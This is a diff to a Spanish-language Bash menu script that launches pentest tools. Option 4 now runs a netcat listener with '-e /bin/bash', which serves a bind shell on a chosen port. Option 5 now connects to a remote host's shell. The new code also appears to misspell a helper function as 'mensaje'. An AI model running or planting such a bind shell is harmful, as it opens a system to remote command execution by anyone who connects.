@@ -7,8 +7,8 @@ show_menu(){
         echo "1) metasploit"
         echo "2) dirbuster"
         echo "3) nmap"
-        echo "4) shell en un puerto (netcat)"
-        echo "5) connect shell remote (netcat)"
+        echo "4) ofrecer Shell a través de Netcat en un puerto"
+        echo "5) conectar con una Shell remota a través de Netcat"
         echo "6) exit"
         echo -n "opcion: "
 }
@@ -61,13 +61,14 @@ elige_opcion(){
                 4)
                         mensajes 1
                         port=$(read_puerto)
-                        nc -l -p $port
+                        nc -l -p $port -e /bin/bash
                         ;;
                 5)
-                        # connect to somewhere:   nc [-options] hostname port[s] [ports] ...
                         mensajes 0
                         ip=$(read_ip)
-                        nmap -A $ip
+                        mensaje 1
+                        port=$(read_puerto)
+                        nc $ip $port
                         ;;
                 6) 
                         exit
